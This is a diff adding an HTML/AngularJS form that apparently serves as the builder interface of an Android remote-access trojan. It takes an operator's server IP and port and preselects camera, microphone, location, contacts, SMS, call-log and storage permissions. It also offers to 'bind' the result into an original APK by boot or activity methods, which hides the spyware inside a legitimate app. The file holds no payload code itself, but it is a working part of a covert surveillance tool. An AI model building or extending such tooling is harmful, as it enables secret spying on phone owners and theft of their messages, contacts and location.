@@ -1,0 +1,130 @@
+<div class="ui segment h100 bg border">
+
+    <table class="ui very compact table bg">
+        <thead>
+            <tr class="center aligned">
+                <th colspan="2">APK Configuration</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr class="center aligned">
+                <td>
+                    <div class="ui labeled fluid input ">
+                        <div class="ui black label">
+                            Server IP
+                        </div>
+                        <input ng-model="srcIP" class="bg2" type="text" placeholder="188.132.xxx.xxx">
+                    </div>
+                </td>
+
+                <td>
+                    <div class="ui labeled fluid input ">
+                        <input ng-model="srcPort" class="bg2" type="number" min="1025" max="65535"
+                            placeholder="default is 42474">
+                        <div class="ui black label">
+                            Server Port
+                        </div>
+                    </div>
+                </td>
+
+            </tr>
+        </tbody>
+    </table>
+    <table class="ui very compact table">
+        <thead>
+            <tr class="center aligned">
+                <th colspan="8">Permissions Customization</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr class="center aligned bg">
+                <td>
+                    <div class="ui checkbox">
+                        <input type="checkbox" id="Permissions1" value="CameraPer" checked>
+                        <label>Camera</label>
+                    </div>
+                </td>
+                <td>
+                    <div class="ui checkbox">
+                        <input type="checkbox" id="Permissions2" value="StoragePer" checked>
+                        <label>Storage</label>
+                    </div>
+                </td>
+                <td>
+                    <div class="ui checkbox">
+                        <input type="checkbox" id="Permissions3" value="MicPer" checked>
+                        <label>Mic</label>
+                    </div>
+                </td>
+                <td>
+                    <div class="ui checkbox">
+                        <input type="checkbox" id="Permissions4" value="LocationPer" checked>
+                        <label>Location</label>
+                    </div>
+                </td>
+                <td>
+                    <div class="ui checkbox">
+                        <input type="checkbox" id="Permissions5" value="ContactsPer" checked>
+                        <label>Contacts</label>
+                    </div>
+                </td>
+                <td>
+                    <div class="ui checkbox">
+                        <input type="checkbox" id="Permissions6" value="SMSPer" checked>
+                        <label>SMS</label>
+                    </div>
+                </td>
+                <td>
+                    <div class="ui checkbox">
+                        <input type="checkbox" id="Permissions7" value="CallsLogsPer" checked>
+                        <label>CallsLogs</label>
+                    </div>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+    <table class="ui very compact table bg">
+        <thead>
+            <tr class="center aligned">
+                <th colspan="3">
+                    <div class="ui checkbox">
+                        <input ng-model="bindApk.enable" type="checkbox" name="bind">
+                        <label>Bind With An Original Apk</label>
+                    </div>
+                </th>
+            </tr>
+        </thead>
+        <tbody ng-hide="!bindApk.enable">
+            <tr class="center aligned">
+                <td>
+                    <div class="ui radio checkbox">
+                        <input type="radio" name="method" checked="checked" ng-model="bindApk.method" value="BOOT">
+                        <label>Boot Method</label>
+                        <span style="font-size: 14px ;color: red">Device restart required</span>
+                    </div>
+                </td>
+                <td>
+                    <button ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable"
+                        class="ui black labeled icon button "><i class="android icon"></i>Browse Apk</button>
+                </td>
+                <td>
+                    <div class="ui radio checkbox">
+                        <input type="radio" name="method" ng-model="bindApk.method" value="ACTIVITY">
+                        <label>Activity Method</label>
+                        <span style="font-size: 14px ;color: red">Doesn't work on all apps</span>
+                    </div>
+                </td>
+            </tr>
+        </tbody>
+        <tfoot class="half-width">
+            <tr class="center aligned">
+                <th colspan="3">
+                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="bindApk.enable" ng-show="Build"
+                        class="ui labeled icon red button"><i class="hammer icon"></i>Build</button>
+                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="Build" ng-show=bindApk.enable
+                        class="ui labeled icon green button"><i class="screwdriver icon"></i>Bind</button>
+                </th>
+            </tr>
+        </tfoot>
+    </table>
+</div>
